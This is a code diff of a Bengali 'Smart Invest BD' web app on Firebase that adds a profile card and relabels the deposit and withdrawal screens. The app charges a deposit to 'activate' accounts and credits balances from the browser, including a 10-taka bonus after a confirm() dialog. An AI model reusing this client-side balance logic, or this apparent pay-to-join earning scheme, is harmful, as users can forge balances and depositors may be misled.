@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart Invest BD - Withdraw Fixed</title>
+    <title>Smart Invest BD - Final Version</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root { --primary-green: #22c55e; --bg-dark: #0f172a; --card-dark: #1e293b; }
@@ -18,7 +18,7 @@
         
         .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: var(--card-dark); z-index: 2005; transition: 0.4s; padding: 20px; box-shadow: 10px 0 30px rgba(0,0,0,0.5); }
         .sidebar.active { left: 0; }
-        .sidebar-item { padding: 15px; color: #cbd5e1; cursor: pointer; border-radius: 10px; margin-bottom: 5px; border-bottom: 1px solid #334155; }
+        .sidebar-item { padding: 15px; color: #cbd5e1; cursor: pointer; border-radius: 10px; margin-bottom: 5px; border-bottom: 1px solid #334155; font-weight: 600; }
         .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2000; }
 
         .container { padding: 20px; max-width: 480px; margin: 0 auto; }
@@ -32,6 +32,10 @@
         .btn { width: 100%; padding: 16px; border: none; border-radius: 15px; font-weight: 700; cursor: pointer; font-size: 17px; }
         .btn-green { background: var(--primary-green); color: white; }
         .btn-blue { background: #3b82f6; color: white; margin-top: 10px; }
+
+        .profile-card { background: var(--card-dark); padding: 20px; border-radius: 15px; border: 1px solid #334155; margin-bottom: 12px; }
+        .profile-card span { color: #94a3b8; font-size: 12px; display: block; margin-bottom: 4px; }
+        .profile-card p { font-weight: 600; word-break: break-all; }
 
         @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
     </style>
@@ -63,7 +67,7 @@
             <div id="signupBox" style="display: none; width: 100%; max-width: 400px; background: var(--card-dark); padding: 30px; border-radius: 25px; text-align: center;">
                 <h2>রেজিস্ট্রেশন</h2><br>
                 <div class="input-group">
-                    <input type="text" id="signupName" placeholder="নাম">
+                    <input type="text" id="signupName" placeholder="পুরো নাম">
                     <input type="email" id="signupEmail" placeholder="ইমেল">
                     <input type="password" id="signupPass" placeholder="পাসওয়ার্ড">
                 </div>
@@ -80,7 +84,7 @@
                 ⚠️ একাউন্ট একটিভ করতে ১০০ টাকা ডিপোজিট দিন।
             </div>
             <div class="welcome-box"><h2 id="welcomeName">স্বাগতম!</h2><p>নিরাপদ বিনিয়োগ</p></div>
-            <div class="balance-box"><p>ব্যালেন্স</p><div class="balance-amount" id="userBalance">৳ 0</div></div>
+            <div class="balance-box"><p>বর্তমান ব্যালেন্স</p><div class="balance-amount" id="userBalance">৳ 0</div></div>
             <button class="btn btn-blue" onclick="startTask()">ডেইলি টাস্ক শুরু করুন</button>
         </div>
     </div>
@@ -88,12 +92,10 @@
     <div id="profileView" class="view-section">
         <div class="navbar"><div class="menu-icon" onclick="showView('homeView')">←</div><div style="font-weight:700;">প্রোফাইল</div></div>
         <div class="container">
-            <div style="background:var(--card-dark); padding:20px; border-radius:15px; border:1px solid #334155; margin-bottom:10px;">
-                <span style="color:#94a3b8; font-size:12px;">ইমেল</span><p id="pEmail">-</p>
-            </div>
-            <div style="background:var(--card-dark); padding:20px; border-radius:15px; border:1px solid #334155; margin-bottom:10px;">
-                <span style="color:#94a3b8; font-size:12px;">স্ট্যাটাস</span><p id="pStatus">-</p>
-            </div>
+            <div class="profile-card"><span>আপনার নাম</span><p id="pName">-</p></div>
+            <div class="profile-card"><span>ইমেল অ্যাড্রেস</span><p id="pEmail">-</p></div>
+            <div class="profile-card"><span>ইউনিক আইডি (UID)</span><p id="pUid" style="color: var(--primary-green);">-</p></div>
+            <div class="profile-card"><span>একাউন্ট স্ট্যাটাস</span><p id="pStatus">-</p></div>
         </div>
     </div>
 
@@ -103,13 +105,13 @@
             <div class="balance-box" style="padding: 20px;"><p>ব্যালেন্স</p><h2 id="witBalance">৳ 0</h2></div>
             <div class="input-group">
                 <select id="witMethod">
-                    <option value="Bkash">বিকাশ</option>
-                    <option value="Nagad">নগদ</option>
+                    <option value="Bkash">বিকাশ (Personal)</option>
+                    <option value="Nagad">নগদ (Personal)</option>
                 </select>
                 <input type="number" id="witAmount" placeholder="পরিমাণ (মিনিমাম ৫০০)">
-                <input type="number" id="witNumber" placeholder="পার্সোনাল নাম্বার">
+                <input type="number" id="witNumber" placeholder="মোবাইল নাম্বার">
             </div>
-            <button class="btn btn-green" id="withdrawBtn" onclick="submitWithdraw()">রিকোয়েস্ট পাঠান</button>
+            <button class="btn btn-green" id="withdrawBtn" onclick="submitWithdraw()">সেন্ড উইথড্র রিকোয়েস্ট</button>
         </div>
     </div>
 
@@ -164,6 +166,9 @@
 
         onAuthStateChanged(auth, (user) => {
             if(user) {
+                // প্রোফাইলে সরাসরি UID সেট করা
+                document.getElementById('pUid').innerText = user.uid;
+                
                 onSnapshot(doc(db, "users", user.uid), (s) => {
                     if(s.exists()){
                         const d = s.data();
@@ -172,6 +177,7 @@
                         document.getElementById('welcomeName').innerText = "স্বাগতম, " + (d.name || "ইউজার");
                         document.getElementById('userBalance').innerText = "৳ " + currentBal;
                         document.getElementById('witBalance').innerText = "৳ " + currentBal;
+                        document.getElementById('pName').innerText = d.name;
                         document.getElementById('pEmail').innerText = d.email;
                         document.getElementById('pStatus').innerText = isActive ? "Active ✅" : "Inactive ❌";
                         document.getElementById('activationAlert').style.display = isActive ? 'none' : 'block';
@@ -182,22 +188,21 @@
             } else { showView('authView'); }
         });
 
-        // Withdrawal Request Function (FIXED)
+        // উইথড্র ফিক্সড ফাংশন
         window.submitWithdraw = async () => {
-            const method = document.getElementById('witMethod').value;
             const amount = Number(document.getElementById('witAmount').value);
+            const method = document.getElementById('witMethod').value;
             const number = document.getElementById('witNumber').value;
             const btn = document.getElementById('withdrawBtn');
 
-            if (amount < 500) return alert("মিনিমাম ৫০০ টাকা উইথড্র করতে হবে।");
-            if (amount > currentBal) return alert("আপনার ব্যালেন্স পর্যাপ্ত নয়।");
-            if (!number || number.length < 11) return alert("সঠিক মোবাইল নাম্বার দিন।");
+            if (amount < 500) return alert("মিনিমাম ৫০০ টাকা প্রয়োজন।");
+            if (amount > currentBal) return alert("পর্যাপ্ত ব্যালেন্স নেই।");
+            if (!number || number.length < 11) return alert("সঠিক নাম্বার দিন।");
 
             btn.disabled = true;
-            btn.innerText = "প্রসেসিং...";
+            btn.innerText = "পাঠানো হচ্ছে...";
 
             try {
-                // ১. উইথড্রয়াল কালেকশনে ডেটা পাঠানো
                 await addDoc(collection(db, "withdrawals"), {
                     uid: auth.currentUser.uid,
                     email: auth.currentUser.email,
@@ -208,47 +213,46 @@
                     timestamp: serverTimestamp()
                 });
 
-                // ২. ইউজারের ব্যালেন্স থেকে টাকা কেটে নেওয়া
                 await updateDoc(doc(db, "users", auth.currentUser.uid), {
                     balance: increment(-amount)
                 });
 
-                alert("উইথড্র রিকোয়েস্ট সফল হয়েছে! অ্যাডমিন চেক করে পেমেন্ট করে দিবে।");
+                alert("উইথড্র রিকোয়েস্ট সফল হয়েছে!");
                 showView('homeView');
-            } catch (error) {
-                console.error(error);
+            } catch (e) {
                 alert("ত্রুটি হয়েছে! আবার চেষ্টা করুন।");
             } finally {
                 btn.disabled = false;
-                btn.innerText = "রিকোয়েস্ট পাঠান";
+                btn.innerText = "সেন্ড উইথড্র রিকোয়েস্ট";
             }
         };
 
         window.submitDeposit = async () => {
             const t = document.getElementById('depTrx').value.trim();
             const a = document.getElementById('depAmount').value;
-            if(!t || !a) return alert("সব তথ্য দিন");
+            if(!t || !a) return alert("তথ্য দিন");
             const q = query(collection(db, "transactions"), where("trxId", "==", t));
             const snap = await getDocs(q);
-            if(!snap.empty) return alert("এই TrxID আগে ব্যবহার হয়েছে!");
+            if(!snap.empty) return alert("এই আইডি আগে ব্যবহার হয়েছে!");
+            
             await addDoc(collection(db, "transactions"), { 
                 uid: auth.currentUser.uid, email: auth.currentUser.email,
                 method: document.getElementById('depMethod').value, amount: Number(a), trxId: t, status: "pending" 
             });
-            alert("সফল হয়েছে!"); closeModal();
+            alert("ডিপোজিট সাবমিট হয়েছে!"); closeModal();
         };
 
         window.startTask = () => {
             if(!isActive) return alert("একাউন্ট একটিভ নয়!");
             window.open(taskLink, '_blank');
             setTimeout(async () => {
-                if(confirm("বোনাস নিতে চান?")) await updateDoc(doc(db, "users", auth.currentUser.uid), { balance: increment(10) });
+                if(confirm("টাস্ক বোনাস নিতে চান?")) await updateDoc(doc(db, "users", auth.currentUser.uid), { balance: increment(10) });
             }, 5000);
         };
 
         window.handleLogin = async () => {
             try { await signInWithEmailAndPassword(auth, document.getElementById('loginEmail').value, document.getElementById('loginPass').value); }
-            catch(e) { alert("ভুল ইমেল বা পাসওয়ার্ড!"); }
+            catch(e) { alert("লগইন ব্যর্থ!"); }
         };
 
         window.handleSignUp = async () => {
